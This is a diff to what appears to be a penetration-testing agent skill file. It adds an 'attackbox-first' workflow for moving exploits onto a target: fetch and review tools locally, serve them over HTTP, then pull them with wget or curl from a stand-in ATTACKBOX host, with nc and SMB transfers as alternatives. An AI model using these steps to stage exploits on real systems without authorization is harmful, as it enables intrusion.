@@ -105,6 +105,28 @@ At each checkpoint and on completion, update the relevant sections of
 
 Keep entries compact — one line per item. State.md is a snapshot, not a log.
 
+## Exploit and Tool Transfer
+
+Never download exploits, scripts, or tools directly to the target from the
+internet (`curl https://github.com/...`, `git clone` on target). Targets may
+lack outbound internet access, and operators must review files before they
+reach the target.
+
+**Attackbox-first workflow:**
+
+1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
+2. **Review** — inspect source code or binary provenance before transferring
+3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
+4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
+   `curl http://ATTACKBOX:8080/file -o /tmp/file`
+
+**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
+`nc` file transfer, base64-encode and paste, or
+`impacket-smbserver share . -smb2support` on attackbox.
+
+**Inline source code** written via heredoc in this skill does not need this
+workflow — the operator can read the code directly.
+
 ## Prerequisites
 
 - <Required access level or position>
